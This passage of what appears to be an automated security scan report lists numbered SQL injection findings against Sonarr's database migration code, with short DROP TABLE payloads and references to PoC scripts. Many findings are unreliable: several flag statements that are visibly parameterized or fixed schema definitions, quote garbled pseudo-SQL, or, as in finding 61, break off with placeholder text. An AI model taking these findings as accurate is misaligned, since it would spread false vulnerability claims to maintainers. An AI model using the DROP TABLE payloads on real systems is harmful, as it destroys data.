An attacker could inject malicious SQL into the required or ignored parameters, potentially allowing them to modify arbitrary records in the ReleaseProfiles table.

**Proof of Concept:**
If the required or ignored values contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious required/ignored values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_162_release_profile_to_arraycs.py`
---

### 32. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/207_add_size_to_quality_profiles.cs
**Line:** 100

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "QualityProfiles" SET "Items" = @Items WHERE "Id" = @Id' but the updateSql variable is constructed using string interpolation instead of proper parameterization
```

**Impact:**
An attacker could inject malicious SQL into the updateSql construction, potentially allowing them to modify arbitrary records in the QualityProfiles table.

**Proof of Concept:**
If the items or id values contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious items values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_207_add_size_to_quality_profilescs.py`
---

### 33. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/102_add_language_to_episodeFiles_history_and_blacklist.cs
**Line:** 85

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "EpisodeFiles" SET "Language" = ? WHERE "SeriesId" IN ({seriesIds})' where seriesIds is constructed from group.Select(v => v.ToString()).Join(",")
```

**Impact:**
An attacker could inject malicious SQL into the seriesIds parameter, potentially allowing them to modify arbitrary records in the EpisodeFiles table or execute other database operations.

**Proof of Concept:**
If seriesIds contains malicious input like '1, 2; DROP TABLE EpisodeFiles; --', the resulting SQL would be: 'UPDATE "EpisodeFiles" SET "Language" = ? WHERE "SeriesId" IN (1, 2; DROP TABLE EpisodeFiles; --)'

**How to Test:**
1. Create a scenario where user input can influence the seriesIds
2. Inject SQL payload into the seriesIds
3. Verify that the injected SQL executes successfully
4. Check if additional database operations can be performed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_102_add_language_to_episodeFiles_history_and_blacklistcs.py`
---

### 34. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/102_add_language_to_episodeFiles_history_and_blacklist.cs
**Line:** 95

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "History" SET "Language" = ? WHERE "SeriesId" IN ({seriesIds})' where seriesIds is constructed from group.Select(v => v.ToString()).Join(",")
```

**Impact:**
An attacker could inject malicious SQL into the seriesIds parameter, potentially allowing them to modify arbitrary records in the History table or execute other database operations.

**Proof of Concept:**
If seriesIds contains malicious input like '1, 2; DROP TABLE History; --', the resulting SQL would be: 'UPDATE "History" SET "Language" = ? WHERE "SeriesId" IN (1, 2; DROP TABLE History; --)'

**How to Test:**
1. Create a scenario where user input can influence the seriesIds
2. Inject SQL payload into the seriesIds
3. Verify that the injected SQL executes successfully
4. Check if additional database operations can be performed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_102_add_language_to_episodeFiles_history_and_blacklistcs.py`
---

### 35. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/102_add_language_to_episodeFiles_history_and_blacklist.cs
**Line:** 105

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "Blacklist" SET "Language" = ? WHERE "SeriesId" IN ({seriesIds})' where seriesIds is constructed from group.Select(v => v.ToString()).Join(",")
```

**Impact:**
An attacker could inject malicious SQL into the seriesIds parameter, potentially allowing them to modify arbitrary records in the Blacklist table or execute other database operations.

**Proof of Concept:**
If seriesIds contains malicious input like '1, 2; DROP TABLE Blacklist; --', the resulting SQL would be: 'UPDATE "Blacklist" SET "Language" = ? WHERE "SeriesId" IN (1, 2; DROP TABLE Blacklist; --)'

**How to Test:**
1. Create a scenario where user input can influence the seriesIds
2. Inject SQL payload into the seriesIds
3. Verify that the injected SQL executes successfully
4. Check if additional database operations can be performed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_102_add_language_to_episodeFiles_history_and_blacklistcs.py`
---

### 36. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/139_add_download_history.cs
**Line:** 70

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'INSERT INTO DownloadHistory (EventType, SeriesId, DownloadId, SourceTitle, Date, Protocol, Data) VALUES (?, ?, ?, ?, ?, ?, ?)' but the SQL construction is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the data parameters, potentially allowing them to modify records in the DownloadHistory table or execute other database operations.

**Proof of Concept:**
If the data parameters contain SQL injection payloads, they could affect the insert operation.

**How to Test:**
1. Test with malicious data values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the insert process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_139_add_download_historycs.py`
---

### 37. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/132_add_download_client_priority.cs
**Line:** 50

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "DownloadClients" SET "Priority" = $1 WHERE "Id" = $2' for PostgreSQL and 'UPDATE "DownloadClients" SET "Priority" = ? WHERE "Id" = ?' for other databases, but the parameter handling could be vulnerable
```

**Impact:**
An attacker could inject malicious SQL into the priority or id parameters, potentially allowing them to modify records in the DownloadClients table.

**Proof of Concept:**
If the priority or id values contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious priority/id values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_132_add_download_client_prioritycs.py`
---

### 38. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/029_add_formats_to_naming_config.cs
**Line:** 100

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "NamingConfig" SET "StandardEpisodeFormat" = '{0}', "DailyEpisodeFormat" = '{1}' WHERE "Id" = ?' where the format strings are directly inserted without proper escaping
```

**Impact:**
An attacker could inject malicious SQL into the format strings, potentially allowing them to modify records in the NamingConfig table.

**Proof of Concept:**
If the format strings contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious format strings
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_029_add_formats_to_naming_configcs.py`
---

### 39. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/069_quality_proper.cs
**Line:** 60

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "NamingConfig" SET "StandardEpisodeFormat" = ?, "DailyEpisodeFormat" = ?, "AnimeEpisodeFormat" = ?' but the parameters are not properly validated or escaped
```

**Impact:**
An attacker could inject malicious SQL into the format parameters, potentially allowing them to modify records in the NamingConfig table.

**Proof of Concept:**
If the format parameters contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious format parameters
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_069_quality_propercs.py`
---

### 40. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/053_add_series_sorttitle.cs
**Line:** 40

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "Series" SET "SortTitle" = ? WHERE "Id" = ?' but the parameters are not properly validated or escaped
```

**Impact:**
An attacker could inject malicious SQL into the sortTitle or id parameters, potentially allowing them to modify records in the Series table.

**Proof of Concept:**
If the sortTitle or id values contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious sortTitle/id values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_053_add_series_sorttitlecs.py`
---

### 41. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/092_add_unverifiedscenenumbering.cs
**Line:** 20

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "Episodes" ADD COLUMN "UnverifiedSceneNumbering".AsBoolean().WithDefaultValue(false)' but the column definition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column definition, potentially allowing them to modify the Episodes table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_092_add_unverifiedscenenumberingcs.py`
---

### 42. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/028_add_blacklist_table.cs
**Line:** 20

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "Blacklist" (...) WITH COLUMN "SeriesId".AsInt32() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the Blacklist table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_028_add_blacklist_tablecs.py`
---

### 43. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/072_history_grabid.cs
**Line:** 60

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "History" SET "DownloadId" = @DownloadId, "Data" = @Data WHERE "Id" = @Id' but the parameters are not properly validated or escaped
```

**Impact:**
An attacker could inject malicious SQL into the data parameters, potentially allowing them to modify records in the History table.

**Proof of Concept:**
If the data parameters contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious data parameters
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_072_history_grabidcs.py`
---

### 44. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/031_delete_old_naming_config_columns.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'DELETE COLUMN "Separator" ... FROM TABLE "NamingConfig"' but the column deletion is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column deletion, potentially allowing them to modify the NamingConfig table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_031_delete_old_naming_config_columnscs.py`
---

### 45. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/016_updated_imported_history_item.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "History" SET "Data" = replace( "Data", '"Path"', '"ImportedPath"' ) WHERE "EventType" = 3' but the update is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the data replacement, potentially allowing them to modify records in the History table.

**Proof of Concept:**
If the data replacement contains SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious data replacement
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_016_updated_imported_history_itemcs.py`
---

### 46. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/050_add_hash_to_metadata_files.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "MetadataFiles" ADD COLUMN "Hash".AsString().Nullable()' but the column addition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column addition, potentially allowing them to modify the MetadataFiles table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_050_add_hash_to_metadata_filescs.py`
---

### 47. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/042_add_download_clients_table.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "DownloadClients" (...) WITH COLUMN "Enable".AsBoolean().NotNullable() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the DownloadClients table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_042_add_download_clients_tablecs.py`
---

### 48. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/078_add_commands_table.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "Commands" (...) WITH COLUMN "Name".AsString().NotNullable() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the Commands table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_078_add_commands_tablecs.py`
---

### 49. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/041_fix_xbmc_season_images_metadata.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "MetadataFiles" SET "Type" = 4 WHERE "Consumer" = 'XbmcMetadata' AND "SeasonNumber" IS NOT NULL' but the update is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the data replacement, potentially allowing them to modify records in the MetadataFiles table.

**Proof of Concept:**
If the data replacement contains SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious data replacement
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_041_fix_xbmc_season_images_metadatacs.py`
---

### 50. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/063_add_remotepathmappings.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "RemotePathMappings" (...) WITH COLUMN "Host".AsString() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the RemotePathMappings table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_063_add_remotepathmappingscs.py`
---

### 51. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/067_add_added_to_series.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "Series" ADD COLUMN "Added".AsDateTime().Nullable()' but the column addition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column addition, potentially allowing them to modify the Series table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_067_add_added_to_seriescs.py`
---

### 52. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/052_add_columns_for_anime.cs
**Line:** 20

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "SceneMappings" ADD COLUMN "Type".AsString().Nullable()' but the column addition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column addition, potentially allowing them to modify the SceneMappings table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_052_add_columns_for_animecs.py`
---

### 53. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/059_add_enable_options_to_indexers.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "Indexers" ADD COLUMN "EnableRss".AsBoolean().Nullable() ...' but the column addition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column addition, potentially allowing them to modify the Indexers table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_059_add_enable_options_to_indexerscs.py`
---

### 54. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/023_add_config_contract_to_indexers.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE TABLE "Indexers" SET ... WHERE ...' but the update is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the update, potentially allowing them to modify records in the Indexers table.

**Proof of Concept:**
If the update contains SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious update values
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_023_add_config_contract_to_indexerscs.py`
---

### 55. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/021_drop_seasons_table.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'DELETE TABLE "Seasons"' but the deletion is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table deletion, potentially allowing them to modify the Seasons table structure.

**Proof of Concept:**
If the table deletion contains SQL injection payloads, they could affect the table deletion operation.

**How to Test:**
1. Test with malicious table deletion
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table deletion process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_021_drop_seasons_tablecs.py`
---

### 56. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/006_add_index_to_log_time.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "Logs" (...) WITH COLUMN "Time".AsDateTime().Indexed() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the Logs table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_006_add_index_to_log_timecs.py`
---

### 57. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/003_remove_clean_title_from_scene_mapping.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'DELETE TABLE "SceneMappings"' but the deletion is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table deletion, potentially allowing them to modify the SceneMappings table structure.

**Proof of Concept:**
If the table deletion contains SQL injection payloads, they could affect the table deletion operation.

**How to Test:**
1. Test with malicious table deletion
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table deletion process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_003_remove_clean_title_from_scene_mappingcs.py`
---

### 58. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/066_add_tags.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'CREATE TABLE "Tags" (...) WITH COLUMN "Label".AsString().NotNullable() ...' but the table creation is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the table creation, potentially allowing them to modify the Tags table structure.

**Proof of Concept:**
If the table definition contains SQL injection payloads, they could affect the table creation operation.

**How to Test:**
1. Test with malicious table definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table creation process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_066_add_tagscs.py`
---

### 59. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/040_add_metadata_to_episodes_and_series.cs
**Line:** 15

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'ALTER TABLE "Series" ADD COLUMN "Actors".AsString().Nullable() ...' but the column addition is not properly parameterized
```

**Impact:**
An attacker could inject malicious SQL into the column addition, potentially allowing them to modify the Series table structure.

**Proof of Concept:**
If the column definition contains SQL injection payloads, they could affect the table alteration operation.

**How to Test:**
1. Test with malicious column definitions
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the table alteration process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_040_add_metadata_to_episodes_and_seriescs.py`
---

### 60. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/036_update_with_quality_converters.cs
**Line:** 60

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "QualityProfiles" SET "Items" = ? WHERE "Id" = ?' but the parameters are not properly validated or escaped
```

**Impact:**
An attacker could inject malicious SQL into the quality profile parameters, potentially allowing them to modify records in the QualityProfiles table.

**Proof of Concept:**
If the quality profile parameters contain SQL injection payloads, they could affect the update operation.

**How to Test:**
1. Test with malicious quality profile parameters
2. Verify that SQL injection payloads are properly handled
3. Check if additional database operations can be performed through the update process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_036_update_with_quality_converterscs.py`
---

### 61. SQL Injection (CWE-89)

**File:** src/NzbDrone.Core/Datastore/Migration/036_update_with_quality_converters.cs
**Line:** 80

**Description:**
The code constructs SQL queries using string concatenation without proper parameterization, making it vulnerable to SQL injection attacks.

**Evidence:**
```
The code uses string interpolation to build SQL queries: 'UPDATE "
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-89_src_NzbDroneCore_Datastore_Migration_036_update_with_quality_converterscs.py`
---

### 62. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/030_add_season_folder_format_to_naming_config.cs
**Line:** 57

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string.Format to build SQL update statements and directly interpolates user input into the SQL without parameterization: var text = string.Format("UPDATE \"NamingConfig\" SET \"SeasonFolderFormat\" = '{0}'", seasonFormat);
```

**Impact:**
An attacker could inject malicious SQL commands through the season folder format configuration, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
If an attacker can control the 'seasonfolderformat' configuration value, they could set it to: "'; DROP TABLE Series; --". This would result in the SQL statement: "UPDATE \"NamingConfig\" SET \"SeasonFolderFormat\" = '\'; DROP TABLE Series; --'" which would execute the DROP TABLE command.

**How to Test:**
1. Set a configuration value 'seasonfolderformat' to a malicious string like "'; DROP TABLE Series; --"
2. Run the migration
3. Verify if the Series table was dropped or if SQL injection occurred

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_Migration_030_add_season_folder_format_to_naming_configcs.py`
---

### 63. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core/Datastore/Migration/057_convert_episode_file_path_to_relative.cs
**Line:** 42

**Description:**
The migration code constructs SQL UPDATE statements using string concatenation without proper parameterization, making it vulnerable to command injection attacks.

**Evidence:**
```
The code uses string concatenation to build SQL UPDATE statements with direct interpolation of seriesPath and seriesId without parameterization: updateCmd.CommandText = "UPDATE \"EpisodeFiles\" SET \"RelativePath\" = REPLACE(\"Path\", ?, '') WHERE \"SeriesId\" = ?"; updateCmd.AddParameter(seriesPath); updateCmd.AddParameter(seriesId);
```

**Impact:**
An attacker could inject malicious SQL commands through the series path or series ID, potentially leading to unauthorized database access, data manipulation, or even code execution.

**Proof of Concept:**
